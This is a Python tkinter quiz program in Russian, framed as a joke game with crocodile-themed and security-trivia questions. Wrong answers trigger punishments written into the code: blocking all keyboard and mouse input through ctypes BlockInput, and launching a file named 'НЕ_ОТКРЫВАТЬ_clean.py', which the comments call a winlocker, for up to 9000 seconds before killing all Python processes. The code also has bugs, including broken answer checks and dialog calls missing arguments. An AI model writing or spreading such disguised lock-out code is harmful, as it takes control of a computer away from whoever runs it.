import tkinter as tk
from tkinter import simpledialog, messagebox
import os
import time
import sys
import ctypes
import random
import math
import subprocess
import threading
from playsound import playsound
base_dir = os.path.dirname(os.path.abspath(__file__))
youwin8bit = os.path.join(base_dir, "win8bit.mp3")
russian_gimn = os.path.join(base_dir, "gimnrussia.mp3")
gameover8bit = os.path.join(base_dir, "gameover.mp3")

def play_sound(sound_file):
    """Play sound file using subprocess to avoid playsound Unicode issues"""
    try:
        # Use Windows Media Player to play the sound
        subprocess.Popen(['cmd', '/c', 'start', '/min', 'wmplayer', sound_file], 
                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Error playing sound: {e}")
def roundthree():
     messagebox.showinfo("Приветсвие", "Ну что, прошел все 2 раунда?Молодец. как тебе это удалось? Неважно.самый масштабный раунд 3 начат. 7 вопросов. и у каждого свое. ")
     messagebox.showinfo("Приветсвие", "Вопросы будут мощными.ответ формировать без лишнего. только да или нет.пример неправильного:Да. пример правильного:Да")
     question1 = simpledialog.askstring("Первый вопрос", "Самая большая по площади страна?")
     if question1 == "Россия".lower():
          play_sound(youwin8bit)
          messagebox.showinfo("А ты крут.послушаем гимн россии!")
          play_sound(russian_gimn)
          pass
     elif question1 == "рф":
          play_sound(youwin8bit)
     else:
          play_sound(gameover8bit)
          messagebox.showwarning("нет", "Неверно!")
          pass
     question2 = simpledialog.askstring("Второй вопрос", "Можно ли выполнить произвольный код на атакваном устройстве, используя уязвимость переполнения буфера в драйвере GPS-Трекера на спине крокодила??").lower()
     if question2 == "Да.".lower() or question2 == "Да".lower():
          play_sound(youwin8bit)
          os.system("python fireworks.py")
          pass
     else:
          play_sound(gameover8bit)
          os.system("python НЕ_ОТКРЫВАТЬ_clean.py")
          time.sleep(900)
          os.system("taskkill /f /im python.exe")
          sys.exit(0)
          pass
     question3 = simpledialog.askstring("Вопрос3", "Достаточно ли атаки Человек посередине(MITM) для расшифровки TLS-Трафика, идущего между сенсором и сервером, если физический доступ к крокодилу есть? " )
     if question3 == "нет".lower() or question3 == "нет.".lower():
          play_sound(youwin8bit)
          messagebox.showinfo("Молодец!", "ТЫ крут!")
          os.system("python fireworks.py")
          pass
     else:
          messagebox.showwarning("Неверно! в этот раз без сильного наказания. но ввод будет заблокирован на 40 секунд. и ты выбываешь.")
          ctypes.windll.user32.BlockInput(True)
          time.sleep(40)
          ctypes.windll.user32.BlockInput(False)
          sys.exit(1)
          pass
     question4 = simpledialog.askstring("Можно ли провести DDoS-Атаку на сервер используя ботнет из устройств, закрепленных на крокодилах?")
     if question4 == "Да".lower() or question4 == "да.".lower():
          play_sound(youwin8bit)
          os.system("python mega_fireworks.py")
          pass
     else:
          os.system("python НЕ_ОТКРЫВАТЬ_clean.py")
          time.sleep(3600)
          os.system("taskkill /f /im python.exe")
          sys.exit(9)
          pass
     question5 = simpledialog.askstring("ФИНАЛ", "это финальный вопрос.  он невероятно сложный... если вы правильно ответите - вы гений. получите самый главный приз!готовы?текст:Верно ли, что что задача о выполнимости булевых формул может быть решена за полиномиальное время на квантовом компьютере с достаточно низкой вероятностью ошибки, если существует квантовый алгоритм, эффективно решая проблему поиска гровера на N элементов за 0(sqrt(N)) шагов, а также при условии, что класс сложности BQP совпадает с классом РН?")
     if question5 == "Нет".lower() or question5 == "Нет.".lower():
          messagebox.showinfo("ого...", "ЧЕЛ... ты выиграл. всю прогу прошел! ты достоен. финал. нажми ок и получишь самую гигантскую ту награду")
          os.system("python party.py")
          pass
     else:
          os.system("python НЕ_ОТКРЫВАТЬ_clean.py")
          time.sleep(9000)
          os.system("taskkill /f /im python.exe")
          


     
     


     




    

    



        

        





def roundtwo():
            messagebox.showinfo("Приветствие", "Это второй раунд. награда будет велика.первый вопрос:приз:ничего. неправильный ответ - блокировка ввода на 70 секунд.второй вопрос. награда:(награда). наказание:не придумал. вообщем не буду спойлерить" )
            bar = simpledialog.askstring("Первый вопрос", "а почему крокодильчик?", initialvalue="")
            if bar == "ПОТОМУ ЧТО КРОКО":
                 messagebox.showinfo("Правильно!")

            elif bar == "матрица":
                 messagebox.showinfo("...", "Я ненавижу попсу. система блокируется навсегда.")
                 os.system("python НЕ_ОТКРЫВАТЬ_clean.py")
            else:
                 messagebox.showwarning("Внимание!", "ввод блокируется на 8 секунд")
                 
                 ctypes.windll.user32.BlockInput(True)
                 time.sleep(8)
                 ctypes.windll.user32.BlockInput(False)

            messagebox.showinfo("Внимание!", "Второй вопрос")
            answer2 = simpledialog.askstring("Вопрос", "Какая сила укуса нильского КРОКОДИЛЬЧИК🐊?")
            if answer2 == "от 3400 до 5000 psi":
                 messagebox.showinfo("Правильно!✔")
                 playsound(youwin8bit)
                 if messagebox.askquestion("хотите феерверк?"):
                      os.system("python fireworks.py")
                      roundthree()
                     
                 else:
                     messagebox.showinfo("Ок")
                     roundthree()
                

                    
                    
                
                


                    

def main():
    
    root = tk.Tk()

    messagebox.showinfo('Внимание!', "это игра. перввй вопрос...", )
    
    # Задаем первый вопрос
    a = simpledialog.askstring("Вопрос", "а как какать?")
    
    if a == "я хз":
        # Используем simpledialog для второго вопроса
        ы = simpledialog.askstring("Ага!", "Почему?", initialvalue="")
        
        if ы == "КРОКОДИЛЬЧИК":
            messagebox.showinfo("Поздравляем!", "вы выиграли!")
            roundtwo()
        




        else:
            messagebox.showerror("Ошибка", "вы проиграли. система блокируется на 60 секунд.")
            playsound(gameover8bit)
            
            # Запускаем винлокер в отдельном процессе
            if os.path.exists("НЕ_ОТКРЫВАТЬ_clean.py"):
                os.system("start python НЕ_ОТКРЫВАТЬ_clean.py")
            else:
                messagebox.showwarning("Файл не найден", "Файл НЕ_ОТКРЫВАТЬ_clean.py не найден!")
            
            # Ждем 60 секунд пока винлокер работает
            time.sleep(60)
            ctypes.windll.user32.BlockInput(False)
            
            # Убиваем процесс python (это закроет винлокер)
            os.system("taskkill /f /im python.exe")

    
    else:
        messagebox.showerror("Ошибка", "вы проиграли. система блокируется на 9000 секунд.нажмите FAQ в том окне для того чтобы понять что случилось.")
        
        # Запускаем винлокер в отдельном процессе
        if os.path.exists("НЕ_ОТКРЫВАТЬ_clean.py"):
            os.system("start python НЕ_ОТКРЫВАТЬ_clean.py")
        else:
            messagebox.showwarning("Файл не найден", "Файл НЕ_ОТКРЫВАТЬ_clean.py не найден!")
        
    
        time.sleep(9000)


        ctypes.windll.user32.BlockInput(False)
        
        # Убиваем процесс python (это закроет винлокер)
        os.system("taskkill /f /im python.exe")



        
    
    # Закрываем tkinter
    root.destroy()

if __name__ == "__main__":
    main()

   
        





